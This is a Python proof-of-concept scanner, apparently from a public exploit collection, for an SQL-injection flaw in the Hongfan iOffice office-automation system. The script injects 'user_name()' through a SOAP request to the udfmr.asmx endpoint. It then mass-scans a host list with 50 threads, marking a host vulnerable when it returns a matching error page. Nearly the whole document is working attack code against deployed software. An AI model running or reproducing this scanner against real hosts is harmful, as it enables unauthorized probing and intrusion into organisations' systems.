#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# app="红帆-ioffice"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Hongfan_OA_Ioffice_Udfmr_Sql_Poc.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {      
        "SOAPAction": '"http://tempuri.org/ioffice/udfmr/GetEmpSearch"',
        "Content-Type": "text/xml; charset=utf-8",
        "Host":"%s" % host2
    }
    vulurl = url + "/iOffice/prg/set/wss/udfmr.asmx"
    data="""
    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
            <condition>1=user_name()</condition>
            </GetEmpSearch>
        </soap:Body>
    </soap:Envelope>"""


    try:
        r = requests.post(vulurl, headers=headers,data=data)
        #print(r.text)
        if r.status_code==500 and "服务器无法处理请求" in r.text :
            print(host+" : true")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])